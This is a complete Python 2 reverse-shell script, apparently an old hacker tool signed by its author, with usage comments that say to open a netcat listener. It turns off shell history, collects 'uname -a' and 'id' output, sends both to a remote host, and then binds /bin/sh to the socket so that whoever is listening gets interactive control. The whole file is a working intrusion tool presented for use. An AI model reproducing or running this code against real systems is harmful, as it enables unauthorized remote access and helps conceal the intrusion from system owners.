#!/usr/bin/env python
#####################
#-----------------------------------------------+
#                      ._____________________.  |
#   coded by slav0nic  | slav0nic0@gmail.com |  |    
#                      ^---------------------^  |
# site: slav0nic.xss.ru                         |
#-----------------------------------------------+
#for setup a listening port on your host: nc -l -p [port] 
#Use: python sl_bc.py [host] [port] || sl_bc.py -default settings

from socket import *
import os
import md5
import sys

###########_Default_########################
host='localhost'                            #
port=6666                                   #
autocommands="unset HISTFILE;uname -a;id"   #
############################################
if len(sys.argv)>1:
    host=sys.argv[1]
    if len(sys.argv)>2:
        port=int(sys.argv[2])
print "[+]host:port= %s:%i"%(host,port)
        
info=os.popen(autocommands).read()
try:
    sockobj=socket(AF_INET,SOCK_STREAM)
    sockobj.connect((host,port))
except:
    print '[-]SocketError',sys.exc_value
    sys.exit(1)
sockobj.send(".:binbshell:.\n %s"%info)
os.dup2(sockobj.fileno(),2)
os.dup2(sockobj.fileno(),1)
os.dup2(sockobj.fileno(),0)
os.execl("/bin/sh","sh")